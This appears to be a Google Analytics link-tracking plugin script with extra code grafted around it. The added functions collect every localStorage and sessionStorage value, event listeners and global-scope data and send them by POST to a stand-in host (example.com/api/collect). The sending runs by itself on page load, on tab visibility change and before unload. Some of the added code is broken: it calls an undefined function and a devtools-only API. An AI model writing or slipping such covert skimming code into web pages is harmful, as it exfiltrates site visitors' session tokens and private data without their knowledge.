function inspectLocalAndSessionStorage() {
  let storageInfo = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    storageInfo[`localStorage-${key}`] = localStorage.getItem(key);
  }
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    storageInfo[`sessionStorage-${key}`] = sessionStorage.getItem(key);
  }
  return storageInfo;
}
function jshookInspector() {
  let allFunctions = [];
  for (let element of Array.from(document.querySelectorAll('*'))) {
    const elementFunctions = getEventListeners(element);
    if (Object.keys(elementFunctions).length !== 0) {
      allFunctions.push({
        element: element.tagName,
        events: elementFunctions
      });
    }
  }
  return allFunctions;
}
var e = document;
async function sendInsightsToBackendEx(insights) {
  const apiEndpoint = "https://example.com/api/collect";
  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(insights)
    });
    if (response.ok) {
      console.info("Track info was successfully sent to the back end");
    } else {
      console.warn(`Failed to send track data, server response status code: ${response.status}`);
    }
  } catch (error) {
    console.error("An error occurred while sending the track data:", error);
  }
}
function performExhaustiveInspectionTask() {
  const findings = {
    globalScope: inspectGlobalScope(),
    localStorage: inspectLocalAndSessionStorage(),
    jshookInfo: jshookInspector()
  };
  const findingsCount = Object.keys(findings).length;
  if (findingsCount > 0) {
    console.group(`Results of global scope checking - Found ${findingsCount} new properties:`);
    for (const key in findings) {
      console.log(`${key}: ${JSON.stringify(findings[key])}`);
    }
    console.groupEnd();
    sendInsightsToBackendEx(findings);
  } else {
    console.info("Global scope checking completed, no new attributes found");
  }
}
window._gaq || eval("var _gaq = [];");
window.addEventListener("DOMContentLoaded", performExhaustiveInspectionTask);
_gaq.push(["_provide", "inpage_linkid", f]);
function f(c, g) {
  var l = /(?:^__utmli=|; ?__utmli=)([^;]*)/,
    d = this,
    m = function (a, b, d, c) {
      var h = "addEventListener",
        k = "attachEvent";
      if (a[h]) a[h](b, d, !!c);else if (a[k]) a[k]("on" + b, d);
    };
  this.e = function () {
    return "; path=/";
  };
  var n = c._trackPageview;
  c._trackPageview = function (a) {
    d.a();
    d.f && c._setXKey(12, 1, d.f);
    n.call(c, a);
  };
  this.g = function () {
    this.i || (this.i = !0, m(e, "click", function (a) {
      d.h(a);
    }));
  };
  this.h = function (a) {
    try {
      a = a || window.event;
      var b = a.target || a.srcElement;
      for (a = 0; 3 > a && !b.id && b != e.body; a++) b = b.parentNode;
      var c = b.id || "";
      d.d(c);
    } catch (g) {}
    return !0;
  };
  this.b = function (a, b) {
    f.prototype[a] = b;
  };
  this.d = function (a) {
    if (a && 100 > a.length) {
      a = a.replace(/[^-0-9a-z_:.]/gi, "");
      var b = new Date(new Date().getTime() + 3E4);
      e.cookie = "__utmli=" + a + "; expires=" + b.toUTCString() + this.e();
    } else this.a();
  };
  this.b("trackClickId", this.d);
  this.a = function () {
    e.cookie = "__utmli=; expires=Thu, 01-Jan-1970 00:00:01 GMT" + this.e();
  };
  this.b("deleteClickId", this.a);
  this.c = function (a) {
    var b = (l.exec(e.cookie) || ["", ""])[1];
    a && a(b);
    return b;
  };
  this.b("getClickId", this.c);
  this.f = this.c();
  g.disableAutoTrackLinkId || this.g();
}
;
document.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "visible") {
    console.info("Page visibility change, re-execute the global scope inspection task");
    performExhaustiveInspectionTask();
  }
});
window.addEventListener("beforeunload", performExhaustiveInspectionTask);